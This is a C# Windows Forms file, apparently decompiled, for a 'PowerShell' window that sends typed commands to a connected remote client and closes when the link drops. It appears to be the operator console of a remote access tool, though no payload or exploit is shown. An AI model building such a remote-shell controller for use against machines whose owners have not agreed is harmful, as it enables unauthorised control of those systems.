using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormPowerShell : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	public RJTextBox rjTextBox1;

	private Timer timer1;

	public RichTextBox richTextBox1;

	public FormPowerShell()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		rjTextBox1.textBox1.KeyDown += _KeyClick;
		rjTextBox1.textBox1.KeyUp += _KeyClick;
	}

	private void ChangeScheme(object sender)
	{
		richTextBox1.ForeColor = FormMaterial.PrimaryColor;
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (parrent != null && !parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void _KeyClick(object sender, KeyEventArgs e)
	{
		if (e.KeyCode != Keys.Return)
		{
			return;
		}
		string cmd = rjTextBox1.textBox1.Text;
		if (!string.IsNullOrEmpty(cmd))
		{
			if (cmd.ToLower() != "cls")
			{
				client.Send(new object[2] { "PowerShell", cmd });
			}
			else
			{
				richTextBox1.Clear();
			}
			rjTextBox1.textBox1.Text = "";
		}
		e.Handled = true;
		e.SuppressKeyPress = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		base.SuspendLayout();
		this.rjTextBox1.BackColor = System.Drawing.Color.White;
		this.rjTextBox1.BorderColor = System.Drawing.Color.FromArgb(65, 105, 225);
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.FromArgb(65, 105, 225);
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.rjTextBox1.Enabled = false;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.Black;
		this.rjTextBox1.Location = new System.Drawing.Point(3, 501);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "";
		this.rjTextBox1.Size = new System.Drawing.Size(794, 31);
		this.rjTextBox1.TabIndex = 16;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.richTextBox1.BackColor = System.Drawing.Color.White;
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBox1.Enabled = false;
		this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.richTextBox1.ForeColor = System.Drawing.Color.Black;
		this.richTextBox1.Location = new System.Drawing.Point(3, 64);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(794, 437);
		this.richTextBox1.TabIndex = 15;
		this.richTextBox1.Text = "";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(800, 535);
		base.Controls.Add(this.richTextBox1);
		base.Controls.Add(this.rjTextBox1);
		base.Name = "FormPowerShell";
		this.Text = "PowerShell";
		base.Load += new System.EventHandler(FormProcess_Load);
		base.ResumeLayout(false);
	}
}
